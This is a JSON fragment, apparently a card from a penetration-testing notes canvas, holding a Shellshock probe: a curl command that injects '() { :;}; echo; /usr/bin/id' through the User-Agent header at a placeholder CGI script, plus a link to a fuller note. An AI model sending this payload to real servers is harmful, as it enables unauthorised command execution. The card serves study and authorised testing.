      "x": 7810,
      "y": 39134,
      "width": 900,
      "height": 276,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\n# Bounded command-effect probe at the actual CGI script\ncurl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \\\n  http://TARGET:PORT/cgi-bin/SCRIPT\n```\n\n[[notes/web-exploitation.md#web-shellshock|Full note & variants]]",
      "color": "4"
